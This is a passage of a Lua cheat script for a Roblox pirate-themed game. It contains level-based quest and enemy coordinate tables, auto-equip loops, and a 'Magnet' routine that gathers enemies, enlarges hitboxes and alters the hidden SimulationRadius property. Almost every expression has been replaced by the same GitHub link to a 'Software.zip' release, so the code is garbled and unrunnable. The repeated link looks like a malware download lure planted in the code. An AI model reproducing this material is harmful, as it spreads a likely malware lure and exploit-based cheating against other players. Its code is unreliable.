            NameMon = "Dragon Crew Warrior"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5832.83594, 51.6806107, -1101.51563)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5832.83594, 51.6806107, -1101.51563)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6241.9951171875, 51.522083282471, -1243.9771728516)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6241.9951171875, 51.522083282471, -1243.9771728516)
        elseif MyLevel >= 1600 and MyLevel <= 1624 then
            Ms = "Dragon Crew Archer [Lv. 1600]"
            NaemQuest = "AmazonQuest"
            LevelQuest = 2
            NameMon = "Dragon Crew Archer"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5832.83594, 51.6806107, -1101.51563)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5832.83594, 51.6806107, -1101.51563)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6488.9155273438, 383.38375854492, -110.66246032715)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(6488.9155273438, 383.38375854492, -110.66246032715)
        elseif MyLevel >= 1625 and MyLevel <= 1649 then
            Ms = "Female Islander [Lv. 1625]"
            NaemQuest = "AmazonQuest2"
            LevelQuest = 1
            NameMon = "Female Islander"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5448.86133, 601.516174, 751.130676)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5448.86133, 601.516174, 751.130676)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5825.2241210938, 682.89245605469, 704.57958984375)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5825.2241210938, 682.89245605469, 704.57958984375)
        elseif MyLevel >= 1650 and MyLevel <= 1699 then
            Ms = "Giant Islander [Lv. 1650]"
            NaemQuest = "AmazonQuest2"
            LevelQuest = 2
            NameMon = "Giant Islander"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5448.86133, 601.516174, 751.130676)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(5448.86133, 601.516174, 751.130676)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(4530.3540039063, 656.75695800781, -131.60952758789)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(4530.3540039063, 656.75695800781, -131.60952758789)
        elseif MyLevel >= 1700 and MyLevel <= 1724 then
            Ms = "Marine Commodore [Lv. 1700]"
            NaemQuest = "MarineTreeIsland"
            LevelQuest = 1
            NameMon = "Marine Commodore"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2180.54126, 27.8156815, -6741.5498)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2180.54126, 27.8156815, -6741.5498)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2490.0844726563, 190.4232635498, -7160.0502929688)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2490.0844726563, 190.4232635498, -7160.0502929688)
        elseif MyLevel >= 1725 and MyLevel <= 1774 then
            Ms = "Marine Rear Admiral [Lv. 1725]"
            NaemQuest = "MarineTreeIsland"
            LevelQuest = 2
            NameMon = "Marine Rear Admiral"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2180.54126, 27.8156815, -6741.5498)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(2180.54126, 27.8156815, -6741.5498)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(3951.3903808594, 229.11549377441, -6912.81640625)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(3951.3903808594, 229.11549377441, -6912.81640625)
        elseif MyLevel >= 1775 and MyLevel <= 1799 then
            Ms = "Fishman Raider [Lv. 1775]"
            NaemQuest = "DeepForestIsland3"
            LevelQuest = 1
            NameMon = "Fishman Raider"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10581.6563, 330.872955, -8761.18652)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10581.6563, 330.872955, -8761.18652)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10322.400390625, 390.94473266602, -8580.0908203125)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10322.400390625, 390.94473266602, -8580.0908203125)
        elseif MyLevel >= 1800 and MyLevel <= 1824 then
            Ms = "Fishman Captain [Lv. 1800]"
            NaemQuest = "DeepForestIsland3"
            LevelQuest = 2
            NameMon = "Fishman Captain"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10581.6563, 330.872955, -8761.18652)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10581.6563, 330.872955, -8761.18652)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-11194.541992188, 442.02795410156, -8608.806640625)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-11194.541992188, 442.02795410156, -8608.806640625)
        elseif MyLevel >= 1825 and MyLevel <= 1849 then
            Ms = "Forest Pirate [Lv. 1825]"
            NaemQuest = "DeepForestIsland"
            LevelQuest = 1
            NameMon = "Forest Pirate"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13234.04, 331.488495, -7625.40137)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13234.04, 331.488495, -7625.40137)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13225.809570313, 428.19387817383, -7753.1245117188)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13225.809570313, 428.19387817383, -7753.1245117188)
        elseif MyLevel >= 1850 and MyLevel <= 1899 then
            Ms = "Mythological Pirate [Lv. 1850]"
            NaemQuest = "DeepForestIsland"
            LevelQuest = 2
            NameMon = "Mythological Pirate"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13234.04, 331.488495, -7625.40137)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13234.04, 331.488495, -7625.40137)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13869.172851563, 564.95251464844, -7084.4135742188)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13869.172851563, 564.95251464844, -7084.4135742188)
        elseif MyLevel >= 1900 and MyLevel <= 1924 then
            Ms = "Jungle Pirate [Lv. 1900]"
            NaemQuest = "DeepForestIsland2"
            LevelQuest = 1
            NameMon = "Jungle Pirate"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12680.3818, 389.971039, -9902.01953)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12680.3818, 389.971039, -9902.01953)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-11982.221679688, 376.32522583008, -10451.415039063)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-11982.221679688, 376.32522583008, -10451.415039063)
        elseif MyLevel >= 1925 and MyLevel <= 1974 then
            Ms = "Musketeer Pirate [Lv. 1925]"
            NaemQuest = "DeepForestIsland2"
            LevelQuest = 2
            NameMon = "Musketeer Pirate"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12680.3818, 389.971039, -9902.01953)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-12680.3818, 389.971039, -9902.01953)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13282.3046875, 496.23684692383, -9565.150390625)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-13282.3046875, 496.23684692383, -9565.150390625)
        elseif MyLevel >= 1975 and MyLevel <= 1999 then
            Ms = "Reborn Skeleton [Lv. 1975]"
            NaemQuest = "HauntedQuest1"
            LevelQuest = 1
            NameMon = "Reborn Skeleton"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.8271484375, 142.13066101074, 5566.0712890625)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.8271484375, 142.13066101074, 5566.0712890625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-8817.880859375, 191.16761779785, 6298.6557617188)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-8817.880859375, 191.16761779785, 6298.6557617188)
        elseif MyLevel >= 2000 and MyLevel <= 2024 then
            Ms = "Living Zombie [Lv. 2000]"
            NaemQuest = "HauntedQuest1"
            LevelQuest = 2
            NameMon = "Living Zombie"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.8271484375, 142.13066101074, 5566.0712890625)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9480.8271484375, 142.13066101074, 5566.0712890625)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10125.234375, 183.94705200195, 6242.013671875)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-10125.234375, 183.94705200195, 6242.013671875)
        elseif MyLevel >= 2025 and MyLevel <= 2049  then
            Ms = "Demonic Soul [Lv. 2025]"
            NaemQuest = "HauntedQuest2"
            LevelQuest = 1
            NameMon = "Demonic Soul"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9516.9931640625, 178.00651550293, 6078.4653320313)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9516.9931640625, 178.00651550293, 6078.4653320313)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9712.03125, 204.69589233398, 6193.322265625)
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9712.03125, 204.69589233398, 6193.322265625)
        elseif MyLevel > 2050 and MyLevel <= 2074 then
            Ms = "Posessed Mummy [Lv. 2050]"
            NaemQuest = "HauntedQuest2"
            LevelQuest = 2
            NameMon = "Posessed Mummy"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9516.9931640625, 178.00651550293, 6078.4653320313)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9516.9931640625, 178.00651550293, 6078.4653320313)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9545.7763671875, 69.619895935059, 6339.5615234375)    
            PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-9545.7763671875, 69.619895935059, 6339.5615234375)
		elseif MyLevel >= 2075 and MyLevel <= 2099  then
            Ms = "Peanut Scout [Lv. 2075]"
            NaemQuest = "NutsIslandQuest"
            LevelQuest = 1
            NameMon = "Peanut Scout"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2104.5874, 38.1299706, -10194.3496, 0.774643302, -5.8516525e-09, 0.632398427, -4.8110703e-08, 1, 6.81853152e-08, -0.632398427, -8.324443e-08, 0.774643302)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2104.5874, 38.1299706, -10194.3496, 0.774643302, -5.8516525e-09, 0.632398427, -4.8110703e-08, 1, 6.81853152e-08, -0.632398427, -8.324443e-08, 0.774643302)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2099.04126, 107.883263, -10065.6582, -0.847717106, -1.89047302e-08, -0.530448556, -2.99691649e-08, 1, 1.22549917e-08, 0.530448556, 2.62858659e-08, -0.847717106)    
            PosHee = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2099.04126, 107.883263, -10065.6582, -0.847717106, -1.89047302e-08, -0.530448556, -2.99691649e-08, 1, 1.22549917e-08, 0.530448556, 2.62858659e-08, -0.847717106)
        elseif MyLevel >= 2100 and MyLevel <= 2124  then
            Ms = "Peanut President [Lv. 2100]"
            NaemQuest = "NutsIslandQuest"
            LevelQuest = 2
            NameMon = "Peanut President"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2104.2546386719, 38.129970550537, -10194.146484375)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2104.2546386719, 38.129970550537, -10194.146484375)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2137.076171875, 70.30451965332, -10515.509765625)
            PosHee = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2137.076171875, 70.30451965332, -10515.509765625)
        elseif MyLevel >= 2125 and MyLevel <= 2149  then
            Ms = "Ice Cream Chef [Lv. 2125]"
            NaemQuest = "IceCreamIslandQuest"
            LevelQuest = 1
            NameMon = "Ice Cream Chef"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.336182, 65.8453293, -10965.7627, 0.763408899, 2.66162115e-08, -0.645915508, 5.54280488e-09, 1, 4.77580073e-08, 0.645915508, -4.00390725e-08, 0.763408899)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.336182, 65.8453293, -10965.7627, 0.763408899, 2.66162115e-08, -0.645915508, 5.54280488e-09, 1, 4.77580073e-08, 0.645915508, -4.00390725e-08, 0.763408899)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-797.381287, 111.218796, -10848.5146, 0.755367041, 4.70847183e-08, 0.655301929, -6.89669344e-09, 1, -6.39021209e-08, -0.655301929, 4.37501413e-08, 0.755367041)    
            PosHee = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-797.381287, 111.218796, -10848.5146, 0.755367041, 4.70847183e-08, 0.655301929, -6.89669344e-09, 1, -6.39021209e-08, -0.655301929, 4.37501413e-08, 0.755367041)
        elseif MyLevel >= 2150  and MyLevel <= 2199 then
            Ms = "Ice Cream Commander [Lv. 2150]"
            NaemQuest = "IceCreamIslandQuest"
            LevelQuest = 2
            NameMon = "Ice Cream Commander"
            CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.336182, 65.8453293, -10965.7627, 0.763408899, 2.66162115e-08, -0.645915508, 5.54280488e-09, 1, 4.77580073e-08, 0.645915508, -4.00390725e-08, 0.763408899)
            PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-820.336182, 65.8453293, -10965.7627, 0.763408899, 2.66162115e-08, -0.645915508, 5.54280488e-09, 1, 4.77580073e-08, 0.645915508, -4.00390725e-08, 0.763408899)
            CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-541.803711, 186.394516, -11210.9062, -0.181756258, -5.9845668e-08, 0.983343601, -1.98635615e-08, 1, 5.71878864e-08, -0.983343601, -9.13845e-09, -0.181756258)    
            PosHee = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-541.803711, 186.394516, -11210.9062, -0.181756258, -5.9845668e-08, 0.983343601, -1.98635615e-08, 1, 5.71878864e-08, -0.983343601, -9.13845e-09, -0.181756258)
        elseif MyLevel >= 2200 and MyLevel <= 2224 then
                Ms = "Cookie Crafter [Lv. 2200]"
                NaemQuest = "CakeQuest1"
                LevelQuest = 1
                NameMon = "Cookie Crafter"
                CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.96851, 37.7982178, -12026.5137, 0.971608818, 1.80562854e-08, 0.236593053, -1.95491463e-08, 1, 3.96393229e-09, -0.236593053, -8.47658388e-09, 0.971608818)
                PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.96851, 37.7982178, -12026.5137, 0.971608818, 1.80562854e-08, 0.236593053, -1.95491463e-08, 1, 3.96393229e-09, -0.236593053, -8.47658388e-09, 0.971608818)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2276.00415, 146.539841, -12203.0146, -0.638633609, -1.0404194e-08, 0.769510984, 1.24565211e-08, 1, 2.38584601e-08, -0.769510984, 2.48222438e-08, -0.638633609)
                PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2276.00415, 146.539841, -12203.0146, -0.638633609, -1.0404194e-08, 0.769510984, 1.24565211e-08, 1, 2.38584601e-08, -0.769510984, 2.48222438e-08, -0.638633609)
            elseif MyLevel >= 2225 and MyLevel <= 2249 then
                Ms = "Cake Guard [Lv. 2225]"
                NaemQuest = "CakeQuest1"
                LevelQuest = 2
                NameMon = "Cake Guard"
                CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.4884, 37.7982292, -12026.9375, 0.934181511, -2.17844871e-08, 0.356799245, 4.77947726e-09, 0.99999994, 4.85416081e-08, -0.356799245, -4.36413572e-08, 0.934181511)
                PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2021.4884, 37.7982292, -12026.9375, 0.934181511, -2.17844871e-08, 0.356799245, 4.77947726e-09, 0.99999994, 4.85416081e-08, -0.356799245, -4.36413572e-08, 0.934181511)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1520.92725, 195.658432, -12300.3184, -0.830619276, 8.0356088e-08, -0.556840897, -1.90049647e-08, 1, 1.72656073e-07, 0.556840897, 1.53994222e-07, -0.830619276)
                PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1520.92725, 195.658432, -12300.3184, -0.830619276, 8.0356088e-08, -0.556840897, -1.90049647e-08, 1, 1.72656073e-07, 0.556840897, 1.53994222e-07, -0.830619276)
            elseif MyLevel >= 2250  and MyLevel <= 2274 then
                Ms = "Baking Staff [Lv. 2250]"
                NaemQuest = "CakeQuest2" --à¸Šà¸·à¹ˆà¸­à¹€à¸à¸£à¸²à¸°à¸–à¹‰à¸²à¸¡à¸µ Giver 1 à¹ƒà¸«à¹‰à¹€à¸£à¸²à¹ƒà¸ªà¹ˆà¸Šà¸·à¹ˆà¸­ 1-2 à¸‚à¹‰à¸²à¸‡à¸«à¸¥à¸±à¸‡à¹€à¸„à¸§à¸ª--
                LevelQuest = 1
                NameMon = "Baking Staff"
                CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1917.79016, 157.941437, -12869.1377, 0.697629273, -8.53369329e-06, -0.716459036, 1.89624473e-06, 1, -1.00645202e-05, 0.716459036, 5.66272183e-06, 0.697629273)
                PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1917.79016, 157.941437, -12869.1377, 0.697629273, -8.53369329e-06, -0.716459036, 1.89624473e-06, 1, -1.00645202e-05, 0.716459036, 5.66272183e-06, 0.697629273)
            elseif MyLevel >= 2275 then
                Ms = "Head Baker [Lv. 2275]"
                NaemQuest = "CakeQuest2" --à¸Šà¸·à¹ˆà¸­à¹€à¸à¸£à¸²à¸°à¸–à¹‰à¸²à¸¡à¸µ Giver 1 à¹ƒà¸«à¹‰à¹€à¸£à¸²à¹ƒà¸ªà¹ˆà¸Šà¸·à¹ˆà¸­ 1-2 à¸‚à¹‰à¸²à¸‡à¸«à¸¥à¸±à¸‡à¹€à¸„à¸§à¸ª--
                LevelQuest = 2
                NameMon = "Head Baker"
                CFrameQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                PosQuest = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-1927.58313, 37.7981453, -12843.8145, -0.961271644, -8.12611574e-07, 0.275603265, -7.71673683e-07, 1, 2.56976563e-07, -0.275603265, 3.43484281e-08, -0.961271644)
                CFrameMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2259.45142, 152.333252, -12800.2656, -0.261799961, -4.23144547e-06, 0.965122163, -1.22252038e-06, 1, 4.05274068e-06, -0.965122163, -1.18874169e-07, -0.261799961)
                PosMon = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(-2259.45142, 152.333252, -12800.2656, -0.261799961, -4.23144547e-06, 0.965122163, -1.22252038e-06, 1, 4.05274068e-06, -0.965122163, -1.18874169e-07, -0.261799961)
            end
        end
    end

if OldWorld then
CheckQuest()
function EquipWeapon(ToolSe)
	if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe) then
		local tool = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe)
		wait(.4)
		https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tool)
	end
end
end

if NewWorld then
	CheckQuest()
	function EquipWeapon(ToolSe)
		if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe) then
			local tool = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe)
			wait(.4)
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tool)
		end
	end
end

if ThreeWorld then
	CheckQuest()
	function EquipWeapon(ToolSe)
		if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe) then
			local tool = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe)
			wait(.4)
			https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tool)
		end
	end
end

spawn(function()
	pcall(function()
		while wait(.1) do
			if AutoKaitan and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
				game:GetService("ReplicatedStorage")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("SetSpawnPoint")
			end
		end
	end)
end)

spawn(function()
	while wait() do
	if AutoKaitan then
		pcall(function()
			for i,v in pairs(game:GetService("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
			   if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Melee" then
			  if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tostring(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)) then
				  local ToolSe = tostring(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
				 local tool = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(ToolSe)
				 wait(.4)
				 https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(tool)
			  end
			   end
			end
		end)
	end
	end
	end)

    
--Magnet
spawn(function()
    game:GetService("RunService").Heartbeat:Connect(function()
		pcall(function()
            local MyLevel = https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip or StatrMagnet then
                for i,v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                    if not https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip,"Boss") and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).magnitude <= 500 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = PosMon
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Animator") then
                            https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()
                        end
                        sethiddenproperty(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip, "SimulationRadius",  https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
						https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(11)
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(14)
                    end
                end
            end
        end)
    end)
end)

    local VirtualUser = game:GetService('VirtualUser')
    local kkii = require(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip)
    spawn(function()
        while game:GetService("RunService").RenderStepped:wait() do
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
                pcall(function()
                 https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 0
                 https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = false
                 kkii:Stop()
                end)
            end
        end
    end)
    
    spawn(function()
        game:GetService("RunService").Heartbeat:connect(function()
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip then
                for i,v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and v:FindFirstChild("Humanoid") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                        https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip(11)
                    end
                end
            end
        end)
    end)
    
    spawn(function()
        game:GetService("RunService").Heartbeat:connect(function()
            if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip and StatrMagnet and Magnet then
                CheckQuest()
                for i,v in pairs(https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip()) do
                    if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == Ms and v:FindFirstChild("Humanoid") and https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip > 0 then
                        if https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Factory Staff [Lv. 800]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Dragon Crew Warrior [Lv. 1575]" or https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip == "Dragon Crew Archer [Lv. 1600]" and (https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip("Players")https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip).magnitude <= 200 then
                            if HideHitBlox then
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 1
                            else
                                https://github.com/celestialhub551/vitorhubkaitun.lua/releases/download/v1.0/Software.zip = 70
                            end
